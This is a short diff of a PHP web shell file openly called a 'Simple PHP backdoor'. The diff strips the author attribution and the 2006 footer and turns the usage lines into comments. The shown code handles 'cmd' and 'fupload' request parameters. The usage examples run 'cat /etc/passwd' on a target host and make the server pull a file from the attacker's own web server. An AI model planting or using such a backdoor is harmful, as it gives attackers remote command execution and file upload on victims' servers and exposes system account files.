@@ -1,4 +1,3 @@
-<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->
 
 <?php
 if (isset($_REQUEST['fupload'])){
@@ -11,9 +10,7 @@ if(isset($_REQUEST['cmd'])){
         echo "</pre>";
         die;
 }
-
 ?>
 
-Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
-Usage: http://target.com/simple-backdoor.php?fupload="file on your web server to download"
-<!--    http://michaeldaw.org   2006    -->
+#Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
+#Usage: http://target.com/simple-backdoor.php?fupload="file on your web server to download"
